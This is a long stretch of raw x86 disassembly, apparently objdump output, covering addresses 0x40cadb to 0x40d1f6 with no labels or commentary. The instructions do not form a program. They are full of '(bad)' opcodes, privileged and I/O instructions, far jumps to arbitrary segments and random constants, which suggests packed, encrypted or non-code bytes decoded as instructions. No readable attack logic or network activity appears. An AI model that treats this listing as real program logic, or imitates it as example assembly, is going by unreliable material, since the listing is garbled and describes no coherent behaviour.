  40cadb:	arpl   WORD PTR ds:0xdb525233,bx
  40cae1:	fstp   TBYTE PTR [esi]
  40cae3:	add    eax,0x8469dfbd
  40cae8:	add    DWORD PTR [ecx-0x46],0xffffffe7
  40caec:	jne    0x40caf8
  40caee:	lock xor dh,dh
  40caf1:	out    0x32,al
  40caf3:	inc    ebx
  40caf4:	or     al,0xb1
  40caf6:	imul   DWORD PTR [ebp+ebx*8-0x47]
  40cafa:	aaa    
  40cafb:	cmp    esi,esi
  40cafd:	mov    edi,0x82e4e5f2
  40cb02:	push   0xffffffcf
  40cb04:	cmc    
  40cb05:	ret    0x225a
  40cb08:	clc    
  40cb09:	lea    edx,[edi-0x55]
  40cb0c:	repnz sbb BYTE PTR [edi],ah
  40cb0f:	dec    edi
  40cb10:	sar    DWORD PTR [edx],0xe3
  40cb13:	cmp    cl,bl
  40cb15:	jp     0x40cae0
  40cb17:	jl     0x40cb6f
  40cb19:	jmp    0xda15328c
  40cb1e:	pop    es
  40cb1f:	mov    bl,0xb5
  40cb21:	adc    esp,0x38
  40cb24:	test   DWORD PTR [edi-0x45],eax
  40cb27:	push   ss
  40cb28:	cmp    eax,0xe3ff78ec
  40cb2d:	dec    BYTE PTR [edi]
  40cb2f:	(bad)  
  40cb30:	or     BYTE PTR [eax],bl
  40cb32:	aas    
  40cb33:	arpl   WORD PTR [esi],sp
  40cb35:	sub    BYTE PTR [edi+edi*1-0x71b43fcf],dl
  40cb3c:	lea    edx,[ecx]
  40cb3e:	cmc    
  40cb3f:	sbb    BYTE PTR [eax+0x66],bh
  40cb42:	fs dec edi
  40cb44:	std    
  40cb45:	mov    al,0x6e
  40cb47:	std    
  40cb48:	or     al,BYTE PTR [ecx]
  40cb4a:	jle    0x40cafc
  40cb4c:	mov    ah,0xe8
  40cb4e:	mov    eax,ds:0x5450e82b
  40cb53:	add    BYTE PTR [edx+edx*4+0xee01cae],al
  40cb5a:	shl    bl,cl
  40cb5c:	in     al,dx
  40cb5d:	mov    ds:0xcd485ff0,al
  40cb62:	into   
  40cb63:	sbb    BYTE PTR [eax+esi*2+0x26],cl
  40cb67:	sub    BYTE PTR [ebx],bh
  40cb69:	sub    eax,0x8643ff6b
  40cb6e:	repnz sbb DWORD PTR cs:[eax],0x5cf5a9b5
  40cb76:	push   ebx
  40cb77:	cmp    BYTE PTR [edi+ebp*1+0x3bbaad32],bl
  40cb7e:	and    BYTE PTR [ebx-0x346f8c8],bh
  40cb84:	and    al,0x14
  40cb86:	outs   dx,DWORD PTR ds:[esi]
  40cb87:	mov    bh,0xce
  40cb89:	and    BYTE PTR [eax+eax*4-0x45],bl
  40cb8d:	xchg   esi,eax
  40cb8e:	dec    ebx
  40cb8f:	push   ecx
  40cb90:	into   
  40cb91:	shr    BYTE PTR [esi],cl
  40cb93:	or     edx,DWORD PTR [edx-0x3937fbc3]
  40cb99:	sub    al,0xc5
  40cb9b:	ins    DWORD PTR es:[edi],dx
  40cb9c:	aad    0x28
  40cb9e:	mov    al,0x8b
  40cba0:	test   BYTE PTR [ebx],0xd0
  40cba3:	xchg   esi,eax
  40cba4:	fmul   DWORD PTR ds:0x26add48e
  40cbaa:	fs add eax,0xb2eefe14
  40cbb0:	(bad)  
  40cbb1:	rcl    DWORD PTR ds:0x6f1abd47,1
  40cbb7:	mov    eax,ds:0x5c8a8803
  40cbbc:	pop    ss
  40cbbd:	(bad)  
  40cbbf:	ret    0x3ba1
  40cbc2:	ja     0x40cb6a
  40cbc4:	mov    ecx,DWORD PTR [ecx]
  40cbc6:	pop    ecx
  40cbc7:	dec    edx
  40cbc8:	sbb    esp,DWORD PTR [esi+ebp*4+0x43]
  40cbcc:	sar    BYTE PTR [ebx-0xcdd5655],0x30
  40cbd3:	xchg   edx,eax
  40cbd4:	and    al,0xa5
  40cbd6:	sar    DWORD PTR [eax],1
  40cbd8:	or     BYTE PTR [eax+0x4d930ba9],ch
  40cbde:	push   0x25
  40cbe0:	not    BYTE PTR [edi+0x39a5d624]
  40cbe6:	lods   al,BYTE PTR ds:[esi]
  40cbe7:	pop    ss
  40cbe8:	lods   eax,DWORD PTR ds:[esi]
  40cbe9:	pushf  
  40cbea:	(bad)  
  40cbeb:	cmp    BYTE PTR [ecx+0x4],dl
  40cbee:	out    0xd9,al
  40cbf0:	mov    bh,0x8f
  40cbf2:	vmwrite esi,ebp
  40cbf5:	xchg   edx,eax
  40cbf6:	mov    eax,ds:0x51b40561
  40cbfb:	adc    bl,dl
  40cbfd:	cmp    edi,DWORD PTR [ebx]
  40cbff:	stos   DWORD PTR es:[edi],eax
  40cc00:	sub    eax,0x2eab9682
  40cc05:	sahf   
  40cc06:	fidivr DWORD PTR [edx]
  40cc08:	icebp  
  40cc09:	push   ss
  40cc0a:	outs   dx,BYTE PTR ds:[esi]
  40cc0b:	mov    eax,ds:0xee7e386
  40cc10:	jno    0x40cbf7
  40cc12:	mov    esi,0x9ed2d738
  40cc17:	and    eax,0xa34f44bc
  40cc1c:	test   DWORD PTR [edx+0x6f],edx
  40cc1f:	std    
  40cc20:	jg     0x40cbba
  40cc22:	out    dx,eax
  40cc23:	into   
  40cc24:	add    ebp,DWORD PTR [edi+ebx*8]
  40cc27:	cmp    BYTE PTR [edi-0x27],ch
  40cc2a:	inc    eax
  40cc2b:	test   eax,0x48d580a2
  40cc30:	cmc    
  40cc31:	lahf   
  40cc32:	jno    0x40cc08
  40cc34:	mov    esi,0x8c95a737
  40cc39:	cmp    esp,DWORD PTR [ebp-0x2a]
  40cc3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc3d:	leave  
  40cc3e:	fiadd  WORD PTR [edi]
  40cc40:	aas    
  40cc41:	je     0x40cbe6
  40cc43:	das    
  40cc44:	gs test al,0x6e
  40cc47:	cmc    
  40cc48:	push   0xfffffffd
  40cc4a:	add    ebx,edi
  40cc4c:	sub    eax,0xe6388ed9
  40cc51:	dec    esi
  40cc52:	lds    ecx,FWORD PTR [esi+edi*8]
  40cc55:	sbb    bl,ch
  40cc57:	lods   al,BYTE PTR ds:[esi]
  40cc58:	jle    0x40ccc6
  40cc5a:	outs   dx,DWORD PTR ds:[esi]
  40cc5b:	data16 test BYTE PTR [ebp-0x51108976],bh
  40cc62:	sub    al,0x39
  40cc64:	mov    cl,0xb5
  40cc66:	shr    BYTE PTR [ebx],1
  40cc68:	mov    ah,0x8c
  40cc6a:	fs mov ch,0x14
  40cc6d:	jecxz  0x40ccda
  40cc6f:	xor    dh,BYTE PTR [ebp-0x6dbf3bc3]
  40cc75:	test   eax,0xe4a83d78
  40cc7a:	adc    esp,esi
  40cc7c:	aaa    
  40cc7d:	mov    eax,0xeaae1871
  40cc82:	jne    0x40cc8a
  40cc84:	lahf   
  40cc85:	icebp  
  40cc86:	call   0x8f5c:0x1d90f816
  40cc8d:	mov    bl,0x64
  40cc8f:	dec    edi
  40cc90:	dec    eax
  40cc91:	xor    ebp,DWORD PTR [eax]
  40cc93:	jns    0x40cc84
  40cc95:	mov    bl,0xfc
  40cc97:	pushf  
  40cc98:	int3   
  40cc99:	imul   edx,DWORD PTR [ecx+edi*2],0xffffffac
  40cc9d:	or     al,0x94
  40cc9f:	cdq    
  40cca0:	div    dh
  40cca2:	js     0x40cce2
  40cca4:	(bad)  
  40cca5:	jnp    0x40cc6e
  40cca7:	mov    ebp,ss
  40cca9:	aaa    
  40ccaa:	(bad)  
  40ccab:	xor    ebx,DWORD PTR [ebx-0x3f]
  40ccae:	mov    al,fs:0xdf53f873
  40ccb4:	mov    ebp,DWORD PTR [edi+0x1b66b26e]
  40ccba:	mov    ds:0xa84be9ea,eax
  40ccbf:	cmp    bh,bh
  40ccc1:	pop    es
  40ccc2:	mov    cl,0xaf
  40ccc4:	sbb    dh,BYTE PTR [edx+0x15]
  40ccc7:	sahf   
  40ccc8:	out    dx,al
  40ccc9:	aaa    
  40ccca:	sub    BYTE PTR [eiz*4+0xc45bfbb],dh
  40ccd1:	jno    0x40cd41
  40ccd3:	cli    
  40ccd4:	outs   dx,BYTE PTR ds:[esi]
  40ccd5:	sub    eax,0x3b98698e
  40ccda:	fbstp  TBYTE PTR [esi+0x137cbb3]
  40cce0:	xor    al,0x2b
  40cce2:	mov    ebx,0xc401cf38
  40cce7:	aad    0x13
  40cce9:	ret    
  40ccea:	mov    edi,0xea727405
  40ccef:	imul   edx,DWORD PTR [eax+eiz*1],0x44bdcc98
  40ccf6:	jo     0x40ccf2
  40ccf8:	call   0xe5353e1c
  40ccfd:	sbb    al,0x9c
  40ccff:	pusha  
  40cd00:	inc    esi
  40cd01:	push   ebx
  40cd02:	in     eax,0x39
  40cd04:	lea    edx,[esi-0x1a]
  40cd07:	retf   
  40cd08:	mov    ds:0xad57af67,eax
  40cd0d:	push   0x5b
  40cd0f:	stos   DWORD PTR es:[edi],eax
  40cd10:	xor    ah,BYTE PTR [esi+edi*4-0x7f005848]
  40cd17:	cmp    ch,BYTE PTR [esi-0x123843ca]
  40cd1d:	cmp    BYTE PTR [ebp-0x2a59f638],ch
  40cd23:	mov    ch,0x9c
  40cd25:	xchg   ebx,eax
  40cd26:	dec    edx
  40cd27:	ret    
  40cd28:	jecxz  0x40cd28
  40cd2a:	inc    edx
  40cd2b:	xlat   BYTE PTR ds:[ebx]
  40cd2c:	sub    DWORD PTR [eax+0x4a],ebx
  40cd2f:	into   
  40cd30:	stc    
  40cd31:	dec    ebp
  40cd32:	mov    bh,0x38
  40cd34:	mov    BYTE PTR [ecx+0x5f],bl
  40cd37:	push   ecx
  40cd38:	and    al,0x8a
  40cd3a:	aad    0x1a
  40cd3c:	adc    DWORD PTR [esi+0x1a],ebp
  40cd3f:	sti    
  40cd40:	push   0x73d95c14
  40cd45:	pusha  
  40cd46:	xchg   edi,eax
  40cd47:	enter  0x3822,0x9f
  40cd4b:	in     eax,0x7e
  40cd4d:	js     0x40cd9f
  40cd4f:	xor    eax,DWORD PTR [eax]
  40cd51:	sahf   
  40cd52:	jl     0x40cd50
  40cd54:	aam    0xfd
  40cd56:	aaa    
  40cd57:	jns    0x40cd4d
  40cd59:	inc    ebx
  40cd5a:	mov    ebx,0x43aac41
  40cd5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd60:	xlat   BYTE PTR ds:[ebx]
  40cd61:	mov    eax,0x1b8e7285
  40cd66:	cmp    ecx,0xfffffff5
  40cd69:	mov    dh,0x5a
  40cd6b:	push   ds
  40cd6c:	scas   al,BYTE PTR es:[edi]
  40cd6d:	cmc    
  40cd6e:	and    ecx,ecx
  40cd70:	add    DWORD PTR [edi],eax
  40cd72:	mov    ebx,0x91381703
  40cd77:	or     al,0x25
  40cd79:	imul   ecx,DWORD PTR ss:[ebp+0x11],0xffffffa9
  40cd7e:	or     al,0xf
  40cd80:	xor    eax,0xf1e0cceb
  40cd85:	xrelease xchg DWORD PTR [eax+0xda8099d],esp
  40cd8c:	enter  0xe986,0xa3
  40cd90:	mov    ebp,0x179f02d
  40cd95:	inc    eax
  40cd96:	hlt    
  40cd97:	aas    
  40cd98:	in     al,dx
  40cd99:	js     0x40cd89
  40cd9b:	push   es
  40cd9c:	or     al,BYTE PTR [esi+ebx*2]
  40cd9f:	rol    BYTE PTR [eax-0x9],1
  40cda2:	fwait
  40cda3:	cmp    ah,bh
  40cda5:	leave  
  40cda6:	in     al,dx
  40cda7:	mov    ah,0xef
  40cda9:	std    
  40cdaa:	call   0x509bb18a
  40cdaf:	mov    bh,0xc5
  40cdb1:	pop    edx
  40cdb2:	rdmsr  
  40cdb4:	ror    al,0x36
  40cdb7:	scas   eax,DWORD PTR es:[edi]
  40cdb8:	idiv   DWORD PTR [eax]
  40cdba:	inc    ebp
  40cdbb:	sahf   
  40cdbc:	sub    al,0x31
  40cdbe:	rcr    ch,0x0
  40cdc1:	jmp    0x72ce:0x3d37e9ac
  40cdc8:	ss xchg esi,eax
  40cdca:	xchg   edi,eax
  40cdcb:	mov    al,0xc3
  40cdcd:	gs xor al,0x39
  40cdd0:	ins    DWORD PTR es:[edi],dx
  40cdd1:	ins    BYTE PTR es:[edi],dx
  40cdd2:	setne  ch
  40cdd5:	out    dx,eax
  40cdd6:	iret   
  40cdd7:	or     bh,cl
  40cdd9:	pushw  0x7c74
  40cddd:	fucomp st(0)
  40cddf:	pop    ebx
  40cde0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cde1:	mov    esi,0xd998646
  40cde6:	(bad)  
  40cde7:	xor    eax,0x5203dfd
  40cdec:	jmp    0x9c9cbc78
  40cdf1:	adc    ecx,ebp
  40cdf3:	xor    al,0xf5
  40cdf5:	jmp    0x40ce55
  40cdf7:	mov    al,0x3e
  40cdf9:	call   0x59e:0x381ad79c
  40ce00:	push   ss
  40ce01:	shl    ebp,0xa4
  40ce04:	repnz popa 
  40ce06:	fild   QWORD PTR [esi*8-0x538a4abf]
  40ce0d:	bnd jo 0x40cdf8
  40ce10:	push   ds
  40ce11:	cmp    BYTE PTR [ebx-0x1e3c1a5],al
  40ce17:	in     al,0xad
  40ce19:	(bad)  
  40ce1a:	outs   dx,BYTE PTR ds:[esi]
  40ce1b:	inc    eax
  40ce1c:	fstp   DWORD PTR [edi-0x4299e6c4]
  40ce22:	(bad)  
  40ce23:	cmp    BYTE PTR [eax-0xcb235fd],ch
  40ce29:	sub    esi,DWORD PTR [edx+0x5610ec84]
  40ce2f:	in     eax,dx
  40ce30:	enter  0x2f22,0x0
  40ce34:	sbb    bl,0x93
  40ce37:	cmp    BYTE PTR [ebx*8+0x2774c752],dh
  40ce3e:	push   ebp
  40ce3f:	and    esi,ebp
  40ce41:	sub    BYTE PTR [eax],al
  40ce43:	mov    edi,0x1d03e89a
  40ce48:	cmp    edi,DWORD PTR cs:[ecx+0x1e464a3]
  40ce4f:	adc    BYTE PTR ds:0xf576c540,dh
  40ce55:	push   cs
  40ce56:	in     al,0x1b
  40ce58:	dec    ecx
  40ce59:	js     0x40ced9
  40ce5b:	lods   eax,DWORD PTR ds:[esi]
  40ce5c:	test   al,0x3b
  40ce5e:	(bad)  
  40ce5f:	xor    dh,BYTE PTR [esi+ecx*4-0xe]
  40ce63:	scas   al,BYTE PTR es:[edi]
  40ce64:	out    0x28,eax
  40ce66:	xchg   ebx,eax
  40ce67:	xchg   edi,eax
  40ce68:	hlt    
  40ce69:	xchg   edi,eax
  40ce6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce6b:	cmp    BYTE PTR [ebx+0x22],ah
  40ce6e:	xchg   ebp,eax
  40ce6f:	lock std 
  40ce71:	hlt    
  40ce72:	cmp    DWORD PTR [esi],0xa210194a
  40ce78:	addr16 xchg ebp,eax
  40ce7a:	dec    esi
  40ce7b:	mov    esp,0x53bef781
  40ce80:	xchg   esi,eax
  40ce81:	shr    BYTE PTR [ecx+0x1d],cl
  40ce84:	dec    edi
  40ce85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce86:	ins    BYTE PTR es:[edi],dx
  40ce87:	outs   dx,DWORD PTR ds:[esi]
  40ce88:	push   esp
  40ce89:	and    cl,cl
  40ce8b:	xor    cl,ch
  40ce8d:	cmp    BYTE PTR [ecx-0x68],dh
  40ce90:	hlt    
  40ce91:	repz mov esp,0xa746f8e1
  40ce97:	mov    esi,DWORD PTR [ebp+0x7b05e2bb]
  40ce9d:	dec    ecx
  40ce9e:	arpl   WORD PTR [ebp+0x38fe839c],cx
  40cea4:	xor    DWORD PTR [ebx],ecx
  40cea6:	ror    dh,cl
  40cea8:	jmp    0x63bd:0xf57adb97
  40ceaf:	std    
  40ceb0:	mov    DWORD PTR [ebp-0x76],edx
  40ceb3:	dec    ebp
  40ceb4:	stos   DWORD PTR es:[edi],eax
  40ceb5:	cmp    esi,DWORD PTR [edx]
  40ceb7:	mov    ebp,0xc504f6eb
  40cebc:	sub    cl,BYTE PTR [esi+0x6a]
  40cebf:	in     eax,dx
  40cec0:	mov    edi,0x59081044
  40cec5:	pusha  
  40cec6:	cld    
  40cec7:	mov    dh,0xa
  40cec9:	cmp    BYTE PTR [ebx+ebp*2+0x2caba9e5],ah
  40ced0:	pop    ds
  40ced1:	or     ebp,DWORD PTR [esi-0x3b]
  40ced4:	xor    BYTE PTR [eax],dh
  40ced6:	cmp    al,0x7d
  40ced8:	push   ecx
  40ced9:	clc    
  40ceda:	fstp   TBYTE PTR [eax]
  40cedc:	(bad)  
  40cedd:	pop    ds
  40cede:	jb     0x40ce8b
  40cee0:	fsub   DWORD PTR [edi-0x110a88b4]
  40cee6:	cld    
  40cee7:	push   0x4a6a131e
  40ceec:	int3   
  40ceed:	out    0xc9,eax
  40ceef:	or     al,0x75
  40cef1:	add    al,0xa9
  40cef3:	(bad)  
  40cef4:	fimul  DWORD PTR [esi]
  40cef6:	jb     0x40cf49
  40cef8:	cmc    
  40cef9:	call   0xa486:0x16f28e8
  40cf00:	stos   DWORD PTR es:[edi],eax
  40cf01:	cmp    edx,DWORD PTR [edi+esi*4-0x5d76c1e]
  40cf08:	dec    esp
  40cf09:	jae    0x40cf7a
  40cf0b:	das    
  40cf0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf0d:	dec    esp
  40cf0e:	xchg   edi,eax
  40cf0f:	retf   
  40cf10:	dec    edx
  40cf11:	test   DWORD PTR [esi],eax
  40cf13:	cmp    DWORD PTR [eax-0x3c9c0d67],esp
  40cf19:	add    BYTE PTR [ebp+0x5a],dl
  40cf1c:	cmc    
  40cf1d:	pop    es
  40cf1e:	cdq    
  40cf1f:	adc    al,0xcd
  40cf21:	mov    ecx,DWORD PTR [ebx+0x2e]
  40cf24:	mov    BYTE PTR [ebx],bh
  40cf26:	ficomp WORD PTR ds:0x82887803
  40cf2c:	dec    edi
  40cf2d:	mov    DWORD PTR [esi+0x67],ebp
  40cf30:	cmp    dl,BYTE PTR [edx+0x75]
  40cf33:	mov    es,WORD PTR [ebx-0x73d4eb88]
  40cf39:	pop    ds
  40cf3a:	xchg   BYTE PTR ds:0x8b781d15,bl
  40cf40:	ret    
  40cf41:	sbb    BYTE PTR [esi-0x42],ch
  40cf44:	jb     0x40cf1b
  40cf46:	test   eax,0x39db27e5
  40cf4b:	pop    ebp
  40cf4c:	je     0x40cf57
  40cf4e:	push   ss
  40cf4f:	sbb    esi,DWORD PTR [ebp+0x42]
  40cf52:	das    
  40cf53:	inc    ebp
  40cf54:	inc    edi
  40cf55:	int3   
  40cf56:	xor    ebp,DWORD PTR [esi-0xb]
  40cf59:	mov    ah,0x5
  40cf5b:	cs fdivr st(4),st
  40cf5e:	icebp  
  40cf5f:	loopne 0x40cf4f
  40cf61:	in     eax,0x61
  40cf63:	sub    BYTE PTR [esi-0x3f],dh
  40cf66:	dec    esi
  40cf67:	iret   
  40cf68:	ins    DWORD PTR es:[edi],dx
  40cf69:	in     eax,dx
  40cf6a:	out    dx,al
  40cf6b:	js     0x40cf15
  40cf6d:	xchg   edi,eax
  40cf6e:	ja     0x40cf60
  40cf70:	push   edx
  40cf71:	(bad)  
  40cf72:	mov    ebx,0xa98787bf
  40cf77:	jo     0x40cf3b
  40cf79:	mov    bh,0x18
  40cf7b:	cmp    eax,edx
  40cf7d:	dec    esp
  40cf7e:	imul   ecx,esi,0xffffffbd
  40cf81:	adc    eax,0x74f5e76d
  40cf86:	fidiv  DWORD PTR [ebx+ebp*2]
  40cf89:	popa   
  40cf8a:	cmp    eax,0xee3bc39b
  40cf8f:	(bad)  
  40cf90:	sub    BYTE PTR [edx+0x5e],dh
  40cf93:	jmp    0x40cfb7
  40cf95:	sub    BYTE PTR [esi+0x35],0x36
  40cf99:	(bad)  
  40cf9a:	fimul  WORD PTR [ebx+eax*1+0x1f]
  40cf9e:	or     al,0xfb
  40cfa0:	pop    ebp
  40cfa1:	xchg   edi,eax
  40cfa2:	out    dx,al
  40cfa3:	cmp    eax,0x89707283
  40cfa8:	popf   
  40cfa9:	ret    0x686e
  40cfac:	jmp    0x40cfd8
  40cfae:	push   ecx
  40cfaf:	push   es
  40cfb0:	clc    
  40cfb1:	mov    WORD PTR [edx+0x7ee21738],ds
  40cfb7:	push   edi
  40cfb8:	jg     0x40cfda
  40cfba:	push   es
  40cfbb:	iret   
  40cfbc:	adc    al,0xb6
  40cfbe:	dec    ebx
  40cfbf:	push   DWORD PTR ds:0xc7aa2dd1
  40cfc5:	sub    BYTE PTR [ebx],cl
  40cfc7:	data16 sbb BYTE PTR ss:[esi+0x2877f55c],0x8a
  40cfd0:	push   eax
  40cfd1:	sbb    BYTE PTR [esi-0x1],ch
  40cfd4:	cs dec ebp
  40cfd6:	nop
  40cfd7:	fs retf 
  40cfd9:	fs mov ch,0x38
  40cfdc:	inc    di
  40cfde:	push   ebx
  40cfdf:	push   ecx
  40cfe0:	bound  esi,QWORD PTR [ecx]
  40cfe2:	xchg   ebx,eax
  40cfe3:	fcomi  st,st(5)
  40cfe5:	sub    al,BYTE PTR [ebx]
  40cfe7:	push   ds
  40cfe8:	jge    0x40cfa7
  40cfea:	add    BYTE PTR [ebp+0x6d],cl
  40cfed:	cmp    eax,DWORD PTR [esi+0x41]
  40cff0:	or     al,dh
  40cff2:	shr    BYTE PTR [ecx+0x33],1
  40cff5:	ja     0x40cff6
  40cff7:	fadd   DWORD PTR [ebx-0x58]
  40cffa:	outs   dx,BYTE PTR ds:[esi]
  40cffb:	adc    DWORD PTR [ebx+0x7a8ecea5],0xffffffe2
  40d002:	xchg   ebp,eax
  40d003:	and    al,0xb
  40d005:	xchg   edx,eax
  40d006:	scas   al,BYTE PTR es:[edi]
  40d007:	clc    
  40d008:	dec    eax
  40d009:	xchg   esp,eax
  40d00a:	fcom   st(3)
  40d00c:	or     eax,0x1cdc6f23
  40d011:	push   edi
  40d012:	pushf  
  40d013:	sbb    DWORD PTR [ebx+eax*8-0x2ad1c700],esp
  40d01a:	(bad)  
  40d01b:	or     BYTE PTR [esi+eax*8],dl
  40d01e:	test   eax,0xd9a2f535
  40d023:	or     BYTE PTR [bx+di-0x23],dl
  40d027:	idiv   DWORD PTR [ebx+0x33]
  40d02a:	fwait
  40d02b:	je     0x40d08f
  40d02d:	or     ch,bl
  40d02f:	or     DWORD PTR [edi],edi
  40d031:	mov    eax,0x68cdbf66
  40d036:	outs   dx,DWORD PTR ds:[esi]
  40d037:	pushf  
  40d038:	push   cs
  40d039:	neg    DWORD PTR [esi+0x30]
  40d03c:	fldenv [esi]
  40d03e:	sbb    eax,0x98c0d11b
  40d043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d044:	(bad)  
  40d045:	jnp    0x40cfd1
  40d047:	xchg   DWORD PTR [ebx-0xae8924e],edi
  40d04d:	mov    ecx,0x9710fe52
  40d052:	in     al,0xf4
  40d054:	ret    0xbc3
  40d057:	jle    0x40d04e
  40d059:	xor    edx,ecx
  40d05b:	sub    DWORD PTR [edi-0xcc14f16],ecx
  40d061:	adc    ebp,DWORD PTR [esi+0x43]
  40d064:	adc    edx,DWORD PTR [edi]
  40d066:	div    BYTE PTR [edx]
  40d068:	jmp    0x2b784d1f
  40d06d:	push   0x1a
  40d06f:	test   BYTE PTR [ebp+eax*1-0xb],ch
  40d073:	cwde   
  40d074:	mov    ecx,0xcb83ff7f
  40d079:	xchg   DWORD PTR [esi+0x67],ebp
  40d07c:	repz sti 
  40d07e:	cmp    bl,dl
  40d080:	outs   dx,BYTE PTR ds:[esi]
  40d081:	repz addr16 ss pop ecx
  40d085:	push   edi
  40d086:	nop
  40d087:	mov    dh,0xf5
  40d089:	push   ebp
  40d08a:	out    0x83,eax
  40d08c:	(bad)
  40d08f:	fsubr  QWORD PTR [ebp+0x7c]
  40d092:	sub    BYTE PTR [edx+0x65],ch
  40d095:	pop    ss
  40d096:	mov    ch,0x38
  40d098:	xchg   DWORD PTR [edi-0x7c8fa07b],ecx
  40d09e:	data16 xchg ch,dh
  40d0a1:	call   FWORD PTR [ebx-0x7b]
  40d0a4:	fnstsw WORD PTR [edi+0x8cfba42]
  40d0aa:	mov    dl,0x2a
  40d0ac:	popf   
  40d0ad:	pusha  
  40d0ae:	push   esi
  40d0af:	imul   ecx,DWORD PTR [eax+ebx*4+0x20],0xffffffb4
  40d0b4:	pop    edx
  40d0b5:	pop    edx
  40d0b6:	outs   dx,DWORD PTR ds:[esi]
  40d0b7:	sbb    ebp,DWORD PTR [edi+0x51]
  40d0ba:	mov    BYTE PTR [eax+0x38eda2fc],bl
  40d0c0:	dec    ebx
  40d0c1:	inc    eax
  40d0c2:	daa    
  40d0c3:	sub    al,0xfb
  40d0c5:	push   0x31e87d13
  40d0ca:	test   eax,0xfad91748
  40d0cf:	jo     0x40d061
  40d0d1:	out    dx,al
  40d0d2:	push   es
  40d0d3:	cmp    DWORD PTR [edi+edx*2-0x33],ecx
  40d0d7:	leave  
  40d0d8:	push   edi
  40d0d9:	xor    esi,eax
  40d0db:	lock jmp 0x6a25:0x2be71a5f
  40d0e3:	ins    DWORD PTR es:[edi],dx
  40d0e4:	cdq    
  40d0e5:	mov    ds:0xfcfa40be,al
  40d0ea:	jecxz  0x40d124
  40d0ec:	or     BYTE PTR [ecx+0x80f3fb1],bl
  40d0f2:	and    ch,BYTE PTR [ebp-0x43]
  40d0f5:	dec    edx
  40d0f6:	outs   dx,DWORD PTR ds:[esi]
  40d0f7:	loope  0x40d143
  40d0f9:	xchg   BYTE PTR [edx],al
  40d0fb:	stos   BYTE PTR es:[edi],al
  40d0fc:	xor    edx,DWORD PTR [esi+0x7]
  40d0ff:	xor    BYTE PTR [ecx-0x12],al
  40d102:	jns    0x40d108
  40d104:	dec    ebp
  40d105:	fdivr  DWORD PTR [ebx-0x1a72696a]
  40d10b:	pop    esi
  40d10c:	loopne 0x40d109
  40d10e:	mov    esi,0x94b83a34
  40d113:	(bad)  
  40d114:	and    ch,bl
  40d116:	cmc    
  40d117:	cmp    BYTE PTR [ecx+0x3],dh
  40d11a:	std    
  40d11b:	mov    al,ds:0xbee19940
  40d120:	cmc    
  40d121:	push   esp
  40d122:	jge    0x40d147
  40d124:	mov    eax,0xbf13b5bc
  40d129:	or     eax,eax
  40d12b:	data16 add al,0xf3
  40d12e:	cs mov al,0xb2
  40d131:	cmp    dl,dh
  40d133:	sbb    esi,ebp
  40d135:	jo     0x40d0c1
  40d137:	bound  ebp,QWORD PTR [eax-0x68bad0a8]
  40d13d:	push   ebp
  40d13e:	xchg   edx,eax
  40d13f:	cmp    BYTE PTR [ebx-0x3745d062],dl
  40d145:	or     dh,0x41
  40d148:	cmc    
  40d149:	in     al,dx
  40d14a:	mov    ds:0xe32c58d0,eax
  40d14f:	mov    ebp,0x7fea3bd7
  40d154:	aaa    
  40d155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d156:	shr    DWORD PTR [eax-0x6d],0xbb
  40d15a:	mov    ds:0x9dbb9443,al
  40d15f:	and    al,0x42
  40d161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d162:	dec    esp
  40d163:	sar    BYTE PTR [esi],1
  40d165:	xor    DWORD PTR [ecx],eax
  40d167:	xchg   edi,eax
  40d168:	stos   DWORD PTR es:[edi],eax
  40d169:	sbb    eax,0xbbb36db0
  40d16e:	shr    BYTE PTR [eax+0x1b6ed975],0xbf
  40d175:	sub    al,0x53
  40d177:	rol    DWORD PTR [esi+0x36],cl
  40d17a:	gs cmp ecx,esp
  40d17d:	push   ecx
  40d17e:	fs jno 0x40d1c9
  40d181:	sti    
  40d182:	repnz push ss
  40d184:	cmc    
  40d185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d186:	push   esi
  40d187:	mov    esp,0x8216b800
  40d18c:	add    al,0x38
  40d18e:	dec    edi
  40d18f:	loopne 0x40d140
  40d191:	xchg   esp,eax
  40d192:	sbb    cl,BYTE PTR [ecx-0x4b908363]
  40d198:	arpl   WORD PTR [esi-0x433b49df],sp
  40d19e:	jecxz  0x40d1d8
  40d1a0:	in     eax,0xfa
  40d1a2:	gs dec esp
  40d1a4:	mov    cl,0x99
  40d1a6:	jns    0x40d13c
  40d1a8:	jb     0x40d1c4
  40d1aa:	ja     0x40d1b8
  40d1ac:	mov    dh,0x18
  40d1ae:	xchg   edx,eax
  40d1af:	cmp    BYTE PTR [eax+0x6aec5693],dh
  40d1b5:	out    0xc1,eax
  40d1b7:	mov    DWORD PTR [ebp-0x1f],esi
  40d1ba:	scas   al,BYTE PTR es:[edi]
  40d1bb:	jbe    0x40d20f
  40d1bd:	xchg   esi,eax
  40d1be:	push   ebx
  40d1bf:	stos   DWORD PTR es:[edi],eax
  40d1c0:	jmp    0xf165b16e
  40d1c5:	das    
  40d1c6:	out    dx,eax
  40d1c7:	inc    esp
  40d1c8:	je     0x40d1ea
  40d1ca:	ja     0x40d193
  40d1cc:	mov    DWORD PTR [ebx],edi
  40d1ce:	aaa    
  40d1cf:	daa    
  40d1d0:	dec    edx
  40d1d1:	inc    ecx
  40d1d2:	adc    ecx,ebp
  40d1d4:	inc    ebx
  40d1d5:	nop
  40d1d6:	outs   dx,BYTE PTR ds:[esi]
  40d1d7:	inc    esp
  40d1d8:	inc    eax
  40d1d9:	arpl   WORD PTR [edx+0x11325fe3],si
  40d1df:	clc    
  40d1e0:	mov    esp,esi
  40d1e2:	outs   dx,BYTE PTR ds:[esi]
  40d1e3:	mov    ah,0x6a
  40d1e5:	lahf   
  40d1e6:	pop    eax
  40d1e7:	sbb    BYTE PTR [edx+0x1],0xdf
  40d1eb:	test   ch,dh
  40d1ed:	adc    eax,0x91fbc5c0
  40d1f2:	fld    TBYTE PTR [edi+0x33]
  40d1f5:	aas    
  40d1f6:	lea    ebp,[ebp-0x30]
